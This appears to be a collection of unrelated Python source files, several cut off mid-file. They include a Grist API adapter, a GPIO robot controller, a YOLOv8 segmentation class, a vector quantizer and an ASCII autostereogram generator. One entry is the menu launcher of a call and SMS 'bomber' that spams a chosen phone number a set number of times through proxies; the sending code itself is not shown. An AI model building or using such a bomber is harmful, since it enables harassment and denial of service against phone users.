    "# pylint: disable=abstract-method\n\"\"\"\nAn adapter for the Grist API.\n\"\"\"\nfrom datetime import (\n    date,\n    datetime,\n)\nfrom typing import (\n    Any,\n    Dict,\n    Iterator,\n    List,\n    Optional,\n    Tuple,\n)\nimport logging\nimport os\nimport urllib.parse\n\nimport requests\nimport requests_cache\n\nfrom . import request_cache_backend\n\nfrom shillelagh.adapters.base import Adapter\nfrom shillelagh.fields import (\n    Boolean,\n    Date,\n    DateTime,\n    Field,\n    Float,\n    Integer,\n    Order,\n    String,\n)\nfrom shillelagh.filters import (\n    Filter,\n    Range,\n)\nfrom shillelagh.typing import (\n    RequestedOrder,\n    Row,\n)\n\nlogger = logging.getLogger()\n\nif os.getenv(\"DEBUG\") and os.getenv(\"DEBUG\").lower() in [\"true\", \"1\"]:\n    logging.basicConfig(level=logging.DEBUG)\n    stdout_handler = logging.StreamHandler()\n    stdout_handler.setLevel(logging.DEBUG)\n    formatter = logging.Formatter(\"%(asctime)s - %(levelname)s - %(message)s\")\n    stdout_handler.setFormatter(formatter)\n    logger.addHandler(stdout_handler)\nelse:\n    logging.basicConfig(level=logging.ERROR)\n\n\nclass GristAPI(Adapter):\n    \"\"\"\n    An adapter for the Grist API.\n    \"\"\"\n\n    # Set this to ``True`` if the adapter doesn't access the filesystem.\n    safe = True\n\n    @staticmethod\n    def supports(uri: str, fast: bool = True, **kwargs: Any) -> Optional[bool]:\n        logger.debug(f\"supports {uri=} {fast=} {kwargs=}\")\n        parsed = urllib.parse.urlparse(uri)\n        logger.debug(f\"supports {parsed=}\")\n        return parsed.scheme == \"grist\"\n\n    @staticmethod\n    def parse_uri(uri: str) -> Tuple[str]:\n        return (uri,)\n\n    def __init__(\n        self,\n        uri: str,\n        org_id: Optional[str] = None,\n        server: Optional[str] = None,\n        api_key: Optional[str] = None,\n    ):\n        super().__init__()\n\n        parsed = urllib.parse.urlparse(uri)\n        query_string = urllib.parse.parse_qs(parsed.query)\n\n        split_path = parsed.path.split(\"/\")\n        self.table_id = None\n        if len(split_path) > 1:\n            self.table_id = split_path[1]\n        self.doc_id = parsed.netloc\n        logger.debug(f\"__init__ {self.doc_id=}\")\n        if not api_key:\n            api_key = query_string[\"key\"][0]\n        if not server:\n            server = query_string[\"server\"][0]\n        if not org_id:\n            org_id = query_string[\"org_id\"][0]\n        self.org_id = org_id\n        self.headers = {\"Authorization\": f\"Bearer {api_key}\"}\n        self.server = server\n\n        backend = request_cache_backend()\n        self._session = requests_cache.CachedSession(\n            cache_name=\"grist_cache\",\n            backend=backend,\n            expire_after=180,\n        )\n\n        if self.doc_id:\n            if self.table_id:\n                self._set_columns_data()\n            else:\n                self._set_columns_tables()\n        else:\n            self._set_columns_docs()\n\n    def _set_columns_data(self) -> None:\n        \"\"\"\n        Call to\n        https://support.getgrist.com/api/#tag/columns/operation/listColumns\n        to set column types\n        \"\"\"\n        logger.debug(f\"_set_columns_data {self.table_id=}\")\n        url = f\"{self.server}/api/docs/{self.doc_id}/tables/{self.table_id}/columns\"\n\n        response = requests.get(url, headers=self.headers)\n        columns = response.json()[\"columns\"]\n\n        def gettype(type):\n            if type == \"Text\":\n                return String(order=Order.ANY)\n            elif type == \"Int\":\n                return Integer(order=Order.ANY)\n            elif type == \"Numeric\":\n                return Float(order=Order.ANY)\n            elif type == \"Bool\":\n                return Boolean(order=Order.ANY)\n            elif type == \"Choice\":\n                return String(order=Order.ANY)\n            elif type == \"ChoiceList\":\n                return String(order=Order.ANY)\n            elif type == \"Date\":\n                return Date(filters=[Range], exact=False, order=Order.ANY)\n            elif type.startswith(\"DateTime:\"):\n                return DateTime(filters=[Range], exact=False, order=Order.ANY)\n            elif type.startswith(\"Ref:\"):\n                return String(order=Order.ANY)\n            elif type.startswith(\"RefList:\"):\n                return String(order=Order.ANY)\n            elif type == \"Attachments\":\n                return String(order=Order.ANY)\n            else:\n                logger.debug(f\"{type=}\")\n                return String(order=Order.ANY)\n\n        labeltypes = [(c[\"id\"], gettype(c[\"fields\"][\"type\"])) for c in columns]\n        self.columns: Dict[str, Field] = {lt[0]: lt[1] for lt in labeltypes}\n        self.columns_datestimes = {\n            k: v for k, v in self.columns.items() if type(v) in [Date, DateTime]\n        }\n        self.columns[\"id\"] = Integer(order=Order.ANY)\n        # self.columns[\"manualSort\"] = Integer(order=Order.ANY)\n        logger.debug(f\"_set_columns_data {self.columns=}\")\n\n    def _set_columns_tables(self) -> Dict[str, Field]:\n        self.columns = {\n     ",
    "from lgpio import gpiochip_open, gpiochip_close, gpio_claim_output, gpio_write, gpio_free\nimport time\n\nclass Robot:\n    def __init__(self, name, lwheel, rwheel):\n        self.name = name\n        self.rwheel = tuple(rwheel)\n        self.lwheel = tuple(lwheel)\n\n        self.rwheel_f = int(rwheel[0])\n        self.rwheel_b = int(rwheel[1])\n\n        self.lwheel_f = int(lwheel[0])\n        self.lwheel_b = int(lwheel[1])\n\n        self.chip = gpiochip_open(0)\n\n        gpio_claim_output(self.chip, self.rwheel_f)\n        gpio_claim_output(self.chip, self.rwheel_b)\n        gpio_claim_output(self.chip, self.lwheel_f)\n        gpio_claim_output(self.chip, self.lwheel_b)\n\n    def forward(self, sec):\n        gpio_write(self.chip, self.rwheel_f, 1)\n        gpio_write(self.chip, self.lwheel_f, 1)\n        time.sleep(sec)\n        gpio_write(self.chip, self.rwheel_f, 0)\n        gpio_write(self.chip, self.lwheel_f, 0)\n\n    def backward(self, sec):\n        gpio_write(self.chip, self.rwheel_b, 1)\n        gpio_write(self.chip, self.lwheel_b, 1)\n        time.sleep(sec)\n        gpio_write(self.chip, self.rwheel_b, 0)\n        gpio_write(self.chip, self.lwheel_b, 0)\n\n    def lturn(self, sec):\n        gpio_write(self.chip, self.rwheel_f, 1)\n        gpio_write(self.chip, self.lwheel_f, 0)\n        time.sleep(sec)\n        gpio_write(self.chip, self.rwheel_f, 0)\n        gpio_write(self.chip, self.lwheel_f, 0)\n\n    def rturn(self, sec):\n        gpio_write(self.chip, self.rwheel_f, 0)\n        gpio_write(self.chip, self.lwheel_f, 1)\n        time.sleep(sec)\n        gpio_write(self.chip, self.rwheel_f, 0)\n        gpio_write(self.chip, self.lwheel_f, 0)\n\n    def cleanup(self):\n        gpio_write(self.chip, self.rwheel_f, 0)\n        gpio_write(self.chip, self.rwheel_b, 0)\n        gpio_write(self.chip, self.lwheel_f, 0)\n        gpio_write(self.chip, self.lwheel_b, 0)\n        gpio_free(self.chip, self.rwheel_f)\n        gpio_free(self.chip, self.rwheel_b)\n        gpio_free(self.chip, self.lwheel_f)\n        gpio_free(self.chip, self.lwheel_b)\n        gpiochip_close(self.chip)\n\ndef main():\n    it = 20\n    i = 0\n    try:\n        while i < it:\n            robot1 = Robot(\"player\", (18, 17), (23, 22))\n            robot1.forward(5)\n            robot1.lturn(5)\n            robot1.rturn(5)\n            robot1.backward(5)\n            robot1.cleanup()\n            i += 1\n    except KeyboardInterrupt:\n        pass\n    finally:\n        robot1.cleanup()\n\nif __name__ == \"__main__\":\n    main()",
    "class Task:\n    def __init__(self, title, description):\n        self.title = title\n        self.description = description\n        self.completed = False\n\n    def mark_as_completed(self):\n        self.completed = True\n\nclass TaskManager:\n    def __init__(self):\n        self.tasks = []\n\n    def add_task(self, title, description):\n        task = Task(title, description)\n        self.tasks.append(task)\n\n    def complete_task(self, title):\n        for task in self.tasks:\n            if task.title == title:\n                task.mark_as_completed()\n                print(f\"Task '{title}' marked as completed.\")\n                return\n        print(f\"Task '{title}' not found.\")\n\n    def display_tasks(self):\n        if not self.tasks:\n            print(\"No tasks found.\")\n            return\n        for idx, task in enumerate(self.tasks, start=1):\n            status = \"Completed\" if task.completed else \"Pending\"\n            print(f\"{idx}. {task.title} - {task.description} [{status}]\")\n\ndef main():\n    task_manager = TaskManager()\n\n    while True:\n        print(\"\\nTask Manager Menu:\")\n        print(\"1. Add Task\")\n        print(\"2. Complete Task\")\n        print(\"3. View Tasks\")\n        print(\"4. Exit\")\n\n        choice = input(\"Enter your choice: \")\n\n        if choice == \"1\":\n            title = input(\"Enter task title: \")\n            description = input(\"Enter task description: \")\n            task_manager.add_task(title, description)\n            print(\"Task added successfully.\")\n        elif choice == \"2\":\n            title = input(\"Enter title of task to mark as completed: \")\n            task_manager.complete_task(title)\n        elif choice == \"3\":\n            task_manager.display_tasks()\n        elif choice == \"4\":\n            print(\"Exiting Task Manager. Goodbye!\")\n            break\n        else:\n            print(\"Invalid choice. Please try again.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# import requests as req\nfrom os import path, system\n\n\nif path.exists(\"./requirements.txt\"):\n    with open(\"./requirements.txt\") as file:\n        libs = [i.split(\"==\")[0] for i in file.readlines()]\n    \n    for lib in libs:\n        print(lib)\n        try:\n            __import__(lib)\n        except ModuleNotFoundError:\n            system(\"pip install \"+lib)\n\n\nfrom pystyle import Col, Center, System\nfrom Plugins.api_list import handler\nfrom colorama import Fore\nfrom Plugins.functions import Functions\n\nr, g = Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX\n\nif __name__ == \"__main__\":\n    logo = f'''\n         {g}\u2588\u2588\u2588\u2588\u2588{r}\u2557{g} \u2588\u2588\u2588{r}\u2557{g}   \u2588\u2588{r}\u2557{g} \u2588\u2588\u2588\u2588\u2588\u2588{r}\u2557{g} \u2588\u2588\u2588{r}\u2557{g}   \u2588\u2588\u2588{r}\u2557{g}\n        \u2588\u2588{r}\u2554\u2550\u2550{g}\u2588\u2588{r}\u2557{g}\u2588\u2588\u2588\u2588{r}\u2557{g}  \u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2554\u2550\u2550\u2550{g}\u2588\u2588{r}\u2557{g}\u2588\u2588\u2588\u2588{r}\u2557{g} \u2588\u2588\u2588\u2588{r}\u2551{g}\n        \u2588\u2588\u2588\u2588\u2588\u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2554{g}\u2588\u2588{r}\u2557{g} \u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2551{g}   \u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2554{g}\u2588\u2588\u2588\u2588{r}\u2554{g}\u2588\u2588{r}\u2551{g}\n        \u2588\u2588{r}\u2554\u2550\u2550{g}\u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2551\u255a{g}\u2588\u2588{r}\u2557{g}\u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2551{g}   \u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2551\u255a{g}\u2588\u2588{r}\u2554\u255d{g}\u2588\u2588{r}\u2551{g}\n        \u2588\u2588{r}\u2551{g}  \u2588\u2588{r}\u2551{g}\u2588\u2588{r}\u2551 \u255a{g}\u2588\u2588\u2588\u2588{r}\u2551\u255a{g}\u2588\u2588\u2588\u2588\u2588\u2588{r}\u2554\u255d{g}\u2588\u2588{r}\u2551 \u255a\u2550\u255d {g}\u2588\u2588{r}\u2551{g}\n        {r}\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d     \u255a\u2550\u255d\n    '''\n\n\n\n\n\n    while True:\n        System.Clear()\n        print(Center.XCenter(logo))\n\n        try:\n            proxy_state = Fore.GREEN + \"Enabled\" if Functions.proxy_state() else Fore.RED + \"Disabled\"\n            choices = {\n                \"1\": \"call\",\n                \"2\": \"sms\"\n            }\n            print(f\"                {Col.yellow}[telegram]{Col.green} @ThisisNaengi\")\n            print(f\"\")\n            print(f\"{Col.yellow}[!]{Col.gray} Proxies are {proxy_state}\")\n            print(f\"{Col.yellow}[!]{Fore.CYAN} Choices: \")\n\n            for ch in choices:\n                print(f\"   {Fore.CYAN}{ch}- {Fore.GREEN}{choices[ch].capitalize()} Bomber \")\n            \n            print()\n            choice = Functions.get_input(f\"{Fore.CYAN}[=]{Col.gray} Enter Your Choice: {Col.green}\", lambda x: x in [str(i) for i in choices])\n            number = Functions.get_input(f\"{Fore.CYAN}[=]{Col.gray} Enter the phone number {Fore.CYAN}[9xxxxxxxxx]{Col.gray}: {Col.green}\", checker=lambda x: x != \"\" and x.isnumeric() and x.startswith(\"9\") and len(x) == 10)\n            count = Functions.get_input(f\"{Fore.CYAN}[=]{Col.gray} Enter spam count: {Col.green}\", lambda x: x.isnumeric() and int(x) >= 0)\n\n            Functions.start(choices[choice], number, int(count))\n\n\n        except KeyboardInterrupt:\n            print(\"\\n\")\n            print(\"\\n\" + Col.yellow, \"t.me/ThisisNaengi\")\n            print(\"\\n\" + Fore.BLUE, \"GoodBye:)\")\n            exit()\n",
    "# Python\nimport glob\nimport argparse\n\ninline_symbol = {\n  \"start_symbol\": '{% mathjax %}',\n  \"end_symbol\": '{% endmathjax %}'\n}\n\nblock_symbol = {\n  \"start_symbol\": '<div align=center>{% mathjax %}',\n  \"end_symbol\": '{% endmathjax %}</div>'\n}\n\ndef get_all_indices(text, substring):\n  indices = []\n  index = -1\n\n  while True:\n    index = text.find(substring, index + 1)\n    if index == -1:\n      break\n    indices.append(index)\n\n  return indices\n\n\ndef render_formula(content, indices, origin_symbol='$', start_symbol='$', end_symbol='$'):\n\n  if len(indices) == 0:\n    return content\n\n  new_content = ''\n  last_idx = 0\n  for i, idx in enumerate(indices):\n    if i%2 == 0:\n      new_content += content[last_idx:idx] + start_symbol\n    else:\n      new_content += content[last_idx:idx] + end_symbol\n    \n    last_idx = idx + len(origin_symbol)\n  \n  new_content += content[last_idx:]\n\n  return new_content\n\n\ndef preprocess(file_path):\n  with open(file_path, 'r', encoding='utf-8') as f:\n    content = f.read()\n    print(content)\n      \n  indices = get_all_indices(content, '$$')\n  assert (len(indices) % 2 == 0)\n  new_content = render_formula(content, indices, origin_symbol='$$', **block_symbol)\n\n  lines = new_content.split('\\n')\n  new_lines = []\n  for line in lines:\n    indices = get_all_indices(line, '$')\n    if len(indices) == 1:\n      new_lines.append(line)\n    else:\n      assert (len(indices) % 2 == 0)\n      new_lines.append(render_formula(line, indices, origin_symbol='$', **inline_symbol))\n\n  with open(file_path, 'w', encoding='utf-8') as f:\n    f.writelines(list(map(lambda x:x+'\\n', new_lines[:-1])) + [new_lines[-1]])\n\n\nif __name__ == \"__main__\":\n  parser = argparse.ArgumentParser()\n  parser.add_argument('-f', '--file', dest='file', type=str)\n  parser.add_argument('-d', '--dir', dest='dir', type=str)\n\n  args = parser.parse_args()\n\n  if args.dir:\n    markdown_files = glob.glob(f\"{args.dir}/*.md\")\n    for file_path in markdown_files:\n      print(f'processing {file_path}')\n      preprocess(file_path)\n  elif args.file:\n    print(f'processing {args.file}')\n    preprocess(args.file)\n  else:\n    print(\"Please specify a .md file or a directory containing .md files\")",
    "# import os\n\n# # Get the current working directory\n# current_dir = os.getcwd()\n# print(\"Current working directory:\", current_dir)\n\n# # Construct the file path relative to the current working directory\n# filename = os.path.join(current_dir, 'japan.txt')\n# print(\"Constructed file path:\", filename)\n\n\n\nimport sys\nfrom PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QVBoxLayout, QWidget\n\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        super().__init__()\n\n        self.initUI()\n\n    def initUI(self):\n        self.setWindowTitle(\"Display Text from External File\")\n        self.setGeometry(100, 100, 400, 300)\n\n        # Text Edit\n        self.text_edit = QTextEdit()\n\n        # Construct file path\n        filename = 'japan.txt' \n        file_path = 'C:\\\\Users\\\\Daksh Chhabra\\\\Downloads\\\\pyqt5_projects\\\\' + filename\n\n        try:\n            # Read text from external file\n            with open(file_path, 'r') as file:\n                text = file.read()\n                self.text_edit.setPlainText(text)\n        except FileNotFoundError:\n            print(f\"File '{filename}' not found.\")\n        except Exception as e:\n            print(f\"Error reading file: {e}\")\n        \n        # Layout\n        layout = QVBoxLayout()\n        layout.addWidget(self.text_edit)\n\n        container = QWidget()\n        container.setLayout(layout)\n        self.setCentralWidget(container)\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    mainWindow = MainWindow()\n    mainWindow.show()\n    sys.exit(app.exec_())\n",
    "# Ultralytics YOLO \ud83d\ude80, AGPL-3.0 license\n\nimport argparse\n\nimport cv2\nimport numpy as np\nimport onnxruntime as ort\n\nfrom ultralytics.utils import ASSETS, yaml_load\nfrom ultralytics.utils.checks import check_yaml\nfrom ultralytics.utils.plotting import Colors\n\n\nclass YOLOv8Seg:\n    \"\"\"YOLOv8 segmentation model.\"\"\"\n\n    def __init__(self, onnx_model):\n        \"\"\"\n        Initialization.\n\n        Args:\n            onnx_model (str): Path to the ONNX model.\n        \"\"\"\n\n        # Build Ort session\n        self.session = ort.InferenceSession(\n            onnx_model,\n            providers=[\"CUDAExecutionProvider\", \"CPUExecutionProvider\"]\n            if ort.get_device() == \"GPU\"\n            else [\"CPUExecutionProvider\"],\n        )\n\n        # Numpy dtype: support both FP32 and FP16 onnx model\n        self.ndtype = np.half if self.session.get_inputs()[0].type == \"tensor(float16)\" else np.single\n\n        # Get model width and height(YOLOv8-seg only has one input)\n        self.model_height, self.model_width = [x.shape for x in self.session.get_inputs()][0][-2:]\n\n        # Load COCO class names\n        self.classes = yaml_load(check_yaml(\"coco128.yaml\"))[\"names\"]\n\n        # Create color palette\n        self.color_palette = Colors()\n\n    def __call__(self, im0, conf_threshold=0.4, iou_threshold=0.45, nm=32):\n        \"\"\"\n        The whole pipeline: pre-process -> inference -> post-process.\n\n        Args:\n            im0 (Numpy.ndarray): original input image.\n            conf_threshold (float): confidence threshold for filtering predictions.\n            iou_threshold (float): iou threshold for NMS.\n            nm (int): the number of masks.\n\n        Returns:\n            boxes (List): list of bounding boxes.\n            segments (List): list of segments.\n            masks (np.ndarray): [N, H, W], output masks.\n        \"\"\"\n\n        # Pre-process\n        im, ratio, (pad_w, pad_h) = self.preprocess(im0)\n\n        # Ort inference\n        preds = self.session.run(None, {self.session.get_inputs()[0].name: im})\n\n        # Post-process\n        boxes, segments, masks = self.postprocess(\n            preds,\n            im0=im0,\n            ratio=ratio,\n            pad_w=pad_w,\n            pad_h=pad_h,\n            conf_threshold=conf_threshold,\n            iou_threshold=iou_threshold,\n            nm=nm,\n        )\n        return boxes, segments, masks\n\n    def preprocess(self, img):\n        \"\"\"\n        Pre-processes the input image.\n\n        Args:\n            img (Numpy.ndarray): image about to be processed.\n\n        Returns:\n            img_process (Numpy.ndarray): image preprocessed for inference.\n            ratio (tuple): width, height ratios in letterbox.\n            pad_w (float): width padding in letterbox.\n            pad_h (float): height padding in letterbox.\n        \"\"\"\n\n        # Resize and pad input image using letterbox() (Borrowed from Ultralytics)\n        shape = img.shape[:2]  # original image shape\n        new_shape = (self.model_height, self.model_width)\n        r = min(new_shape[0] / shape[0], new_shape[1] / shape[1])\n        ratio = r, r\n        new_unpad = int(round(shape[1] * r)), int(round(shape[0] * r))\n        pad_w, pad_h = (new_shape[1] - new_unpad[0]) / 2, (new_shape[0] - new_unpad[1]) / 2  # wh padding\n        if shape[::-1] != new_unpad:  # resize\n            img = cv2.resize(img, new_unpad, interpolation=cv2.INTER_LINEAR)\n        top, bottom = int(round(pad_h - 0.1)), int(round(pad_h + 0.1))\n        left, right = int(round(pad_w - 0.1)), int(round(pad_w + 0.1))\n        img = cv2.copyMakeBorder(img, top, bottom, left, right, cv2.BORDER_CONSTANT, value=(114, 114, 114))\n\n        # Transforms: HWC to CHW -> BGR to RGB -> div(255) -> contiguous -> add axis(optional)\n        img = np.ascontiguousarray(np.einsum(\"HWC->CHW\", img)[::-1], dtype=self.ndtype) / 255.0\n        img_process = img[None] if len(img.shape) == 3 else img\n        return img_process, ratio, (pad_w, pad_h)\n\n    def postprocess(self, preds, im0, ratio, pad_w, pad_h, conf_threshold, iou_threshold, nm=32):\n        \"\"\"\n        Post-process the prediction.\n\n        Args:\n            preds (Numpy.ndarray): predictions come from ort.session.run().\n            im0 (Numpy.ndarray): [h, w, c] original input image.\n            ratio (tuple): width, height ratios in letterbox.\n            pad_w (float): width padding in letterbox.\n            pad_h (float): height padding in letterbox.\n            conf_threshold (float): conf threshold.\n            iou_threshold (float): iou threshold.\n            nm (int): the number of masks.\n\n        Returns:\n            boxes (List): list of bounding boxes.\n            segments (List): list of segments.\n            masks (np.ndarray): [N, H, W], output masks.\n        \"\"\"\n        x, protos = preds[0], preds[1]  # Two outputs: predictions and protos\n\n        # Transpose the first output: (Batch_size, xywh_conf_cls_nm, Num_anchors) -> (Batch_size, Num_anchors, xywh_conf_cls_nm)\n        x = np.einsum(\"bcn->bnc\", x)\n\n        # ",
    "import logging\n\nlogger = logging.getLogger(__name__)\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n__all__ = [\"SimpleVectorQuantizer\"]\n\n\nclass SimpleVectorQuantizer(nn.Module):\n    \"\"\"SimpleVectorQuantizer\"\"\"\n\n    def __init__(\n        self,\n        temp,\n        groundTruthPerplexity=None,\n        time_first=True,\n        use_gumbel=False,\n        hard=True,\n    ):\n        super().__init__()\n        self.time_first = time_first\n        self.use_gumbel = use_gumbel\n        self.hard = hard\n\n        # tenperature for vector quantizer\n        if isinstance(temp, str):\n            import ast\n\n            if temp.startswith(\"learnable=\"):\n                self.temp_type = \"learnable\"\n                temp = temp.replace(\"learnable=\", \"\")\n                temp = ast.literal_eval(temp)\n                self.curr_temp = nn.parameter.Parameter(torch.FloatTensor([temp]))\n                logger.info(\"Setting vq temp learnable (init={})\".format(temp))\n            elif temp.startswith(\"fixed=\"):\n                self.temp_type = \"fixed\"\n                temp = temp.replace(\"fixed=\", \"\")\n                temp = ast.literal_eval(temp)\n                self.register_buffer(\"curr_temp\", torch.FloatTensor([temp]))\n                logger.info(\"Setting vq temp fixed={}\".format(temp))\n            else:\n                self.temp_type = \"scheduled\"\n                temp = ast.literal_eval(temp)\n                assert len(temp) == 3, f\"{temp}, {len(temp)}\"\n\n                self.max_temp, self.min_temp, self.temp_decay = temp\n                logger.info(\"Setting vq temp scheduled = ({},{},{})\".format(*temp))\n                self.curr_temp = self.max_temp\n        self.codebook_indices = None\n\n        self.groundTruthPerplexity = groundTruthPerplexity\n        if self.groundTruthPerplexity is not None:\n            self.perplexity_criteria = nn.MSELoss()\n\n    def set_num_updates(self, num_updates):\n        if self.temp_type == \"scheduled\":\n            self.curr_temp = max(\n                self.max_temp * self.temp_decay**num_updates, self.min_temp\n            )\n\n    def forward(self, x, prob_msk=[0, 2, 3], produce_targets=True):\n\n        if not self.time_first:\n            x = x.transpose(1, 2)\n\n        result = {\"num_vars\": x.shape[-1]}\n        bsz, tsz, fsz = x.shape\n        x = x.reshape(-1, fsz)\n        # x.shape = (bsz, tsz, grps * num_vars)\n\n        x = x.view(bsz * tsz * 1, -1)\n        # x.shape = (bsz * tsz * grps, num_vars)\n\n        # exclude special token\n        for i in prob_msk:\n            x[:, i] += float(\"-inf\")\n\n        # k is the indices of the largest logits among num_vars\n        _, k = x.max(-1)\n\n        # hard_x: one hot for the choosen codewords ( bsz * tsz, 1, num_vars )\n        hard_x = (\n            x.new_zeros(*x.shape)\n            .scatter_(-1, k.view(-1, 1), 1.0)\n            .view(bsz * tsz, 1, -1)\n        )\n\n        hard_x = hard_x.squeeze()\n\n        # hard_probs: probs for all codewords in each codebook group : (grp, num_vars) (use one-hot as prob)\n        hard_probs = torch.mean(hard_x.float(), dim=0)\n\n        # codebook perplexity sigma {e^(entropy for codebook group)} for all codebook groups\n        result[\"code_perplexity\"] = torch.exp(\n            -torch.sum(hard_probs * torch.log(hard_probs + 1e-7), dim=-1)\n        ).sum()\n\n        # average over minibatch and all timesteps of the codewords logits and get their prob by softmax (grp, num_vars)\n        avg_probs = torch.softmax(x.view(bsz * tsz, 1, -1).float(), dim=-1).mean(dim=0)\n\n        probs_per_t = (\n            torch.softmax(x.view(bsz, tsz, -1), dim=-1).contiguous().permute(1, 0, 2)\n        )\n        # probs_per_t shape (tsz,bsz,num_vars)\n        assert probs_per_t.shape[0] == tsz\n        assert probs_per_t.shape[1] == bsz\n\n        ent_per_t = -torch.sum(probs_per_t * torch.log(probs_per_t + 1e-9), dim=-1)\n        # ent_per_t shape (tsz,bsz)\n        ent_per_t = ent_per_t.mean(dim=-1)\n        # ent_per_t shape (tsz,)\n        del probs_per_t\n        result[\"ent_per_t\"] = ent_per_t\n\n        # prob_cpx : probs for all codewords in each codebook group : (grp, num_vars) (use softmax as prob)\n        result[\"prob_perplexity\"] = torch.exp(\n            -torch.sum(avg_probs * torch.log(avg_probs + 1e-7), dim=-1)\n        ).sum()\n\n        result[\"temp\"] = self.curr_temp.item()\n        if self.training:\n            if self.use_gumbel:\n                x = F.gumbel_softmax(\n                    x.float(), tau=self.curr_temp, hard=self.hard\n                ).type_as(x)\n            else:\n                x = x / self.curr_temp\n                x = F.softmax(x, dim=-1).type_as(x)\n                if self.hard:\n                    # print(x.shape)\n                    # print(hard_x.shape)\n                    # exit(1)\n                    x = hard_x + x - x.detach()\n\n        else:\n            x = hard_x\n\n        x = x.view(bsz * tsz, -1)\n        # x (bsz * tsz, group * num_vars)\n\n        # add gumbel softmax hard target\n        result[\"subword_prob\"] = ",
    "#!/usr/bin/env python3\n\nimport sys\nimport random\nimport argparse\nimport typing\nimport textwrap\n\n\ndef char_to_depth_value(c: str) -> int:\n    assert len(c) == 1\n    if c == ' ':\n        return 0\n    ascii_ord = ord(c)\n    if ascii_ord >= 48 and ascii_ord <= 57: # numeric character\n        return ascii_ord - 48 # '0' -> 0 etc\n    if ascii_ord >= 97 and ascii_ord <= 122:    # a-z\n        return ascii_ord - 96 # 'a' -> 1, 'b' -> 2, etc\n    if ascii_ord >= 65 and ascii_ord <= 90:     # A-Z\n        return 64 - ascii_ord # 'A' -> -1, 'B' -> -2, etc\n    print(f\"Error: Illegal character in depth map. Found '{c}'; ord('{c}')={ord(c)}.\",\n            \"Quitting.\",\n            sep=\"\\n\",\n            file=sys.stderr)\n    sys.exit(1)\n\n\n\ndef parse_depth_map_file(filename: str, width: int, height: int, depth_rescale_factor: float) -> list[list[int]]:\n    with open(filename, \"r\") as file:\n        lines = file.read().splitlines()\n        if len(lines) == 0:\n            print(f\"Error: depthfile is empty.\\nQuitting.\", file=sys.stderr)\n            sys.exit(1)\n        max_line_length = max([len(l) for l in lines])\n        if width is None:\n            width = max_line_length\n        if height is not None:\n            if height <= len(lines):\n                lines = lines[:height]\n            else:   # height > len(lines)\n                # center vertically\n                total_lines_to_add = height - len(lines)\n                lines_above = total_lines_to_add // 2\n                lines_below = total_lines_to_add - lines_above\n                lines = ['']*lines_above + lines + ['']*lines_below\n        lines = [f\"{l:<{max_line_length}}\" for l in lines]  # fill all lines to the same length\n        lines = [f\"{l[:width]:^{width}}\" for l in lines]    # trim or pad (centered) every line to wdth\n        result = [[char_to_depth_value(char) for char in l] for l in lines] # map to integer values\n        result = [[round(x * depth_rescale_factor) for x in l] for l in result] # rescale and round to integer\n        assert len(result) == height or height is None\n        assert len(result) != 0\n        for x in result:\n            assert len(x) == width or width is None\n        return result\n\n\n\n\ndef pattern_from_file(filename: str, height: int, shift: int) -> list[list[str]]:\n    with open(filename, \"r\") as file:\n        lines = file.read().splitlines()\n        lines = lines[:height]\n        result = [[char for char in l] for l in lines]\n        for line_number, line in enumerate(result):\n            if len(line) < shift:\n                print(f\"Error: Pattern too short, line {line_number} of pattern file is shorter than SHIFT.\",\n                        \"Exiting.\",\n                        sep='\\n',\n                        file=sys.stderr)\n                sys.exit(1)\n        return result\n\n\n\n# patternwidth should be greater than the shift, surplus is needed to fill in holes\n# shift + width is guaranteed to be enough even in the most ridiculous circumstances\ndef random_pattern(height: int, patternwidth: int) -> list[list[str]]:\n    assert patternwidth >= 2\n    char_pool = list(\"aAbBcdDeEfFgGhHiJKLmMnNOPqQrRstTuVwXyZ12346789@#%$&/\\\\?^ ,;.:-_+*~\\\"!=|{}[]()><'`\")\n    result = []\n    for i in range(height):\n        line = []\n        while len(line) < patternwidth:\n            random.shuffle(char_pool)\n            line += char_pool\n        result.append(line[:patternwidth])\n    return result\n\n\n\ndef validate_shift_arg(shift: int, depthmap: list[list[int]]) -> None:\n    max_abs_val = max([abs(val) for line in depthmap for val in line])\n    if shift <= max_abs_val:\n        print(\"Error: SHIFT must be greater than the largest absolute value in the depth map.\",\n                f\"Found SHIFT = {shift} and largest absolute in depth map = {max_abs_val}.\",\n                \"For tips on choosing a good SHIFT value, use the --help option.\",\n                \"Exiting.\",\n                sep='\\n',\n                file=sys.stderr)\n        sys.exit(1)\n    elif shift < 2:\n        print(\"Error: SHIFT must be 2 or greater.\",\n                f\"Found {shift = }\",\n                \"Exiting.\",\n                sep='\\n',\n                file=sys.stderr)\n        sys.exit(1)\n\n\n\ndef validate_surplus(surplus: list[str], line_number: int) -> None:\n    if len(surplus) == 0:\n        print(f\"Error: ran out of pattern surplus, pattern file does not contain enough characters in line {line_number}.\",\n                \"Exiting.\",\n                sep='\\n',\n                file=sys.stderr)\n        sys.exit(1)\n\n\n\ndef generate_autostereogram(depth_map: list[list[int]], shift: int, pattern: list[list[str]]) -> str:\n    assert len(pattern) == len(depth_map)\n    assert len(depth_map) >= 1\n    assert shift >= 2\n    assert len(pattern[0]) > shift\n    result = \"\"\n\n    for li, dml in enumerate(depth_map): # line index, depth map line\n        result_line, surplus = pattern[li][:shift], pattern[li][shift:]\n        result_line += [None] * len(dml)\n        for x, elevation in enumerate(dml):\n            if",
